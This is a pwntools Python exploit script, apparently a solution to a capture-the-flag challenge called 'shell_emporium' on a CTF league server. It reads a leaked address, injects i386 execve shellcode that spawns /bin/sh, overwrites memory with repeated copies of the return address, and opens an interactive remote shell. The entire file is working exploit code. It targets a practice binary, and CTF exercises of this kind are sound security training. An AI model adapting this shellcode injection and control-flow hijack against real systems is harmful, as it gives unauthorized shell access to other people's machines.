#!/usr/bin/env python3
# Usage:
# ./pwnshellcode.py [GDB]

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.update(arch="i386", os="linux")

p = remote("chal.ctf-league.osusec.org", 1318)
# p = process("./shell_emporium")

print(p.recvuntil(b'IGNORE: '))
addr1 = p.recvline().split(b"\n")[0]
addr1 = int(addr1, 16)
print(p.recv())
p.sendline(b"2")
print(p.recv())


shellcode = asm(
f'''
mov eax, 0xB
mov ebx, {addr1}
xor ecx, ecx
xor edx, edx
int 0x80
''')

p.send(b"/bin/sh\x00")
p.sendline(shellcode)
print(p.recv())
addr2 = p32(addr1+8)
p.sendline(20*addr2)


p.interactive()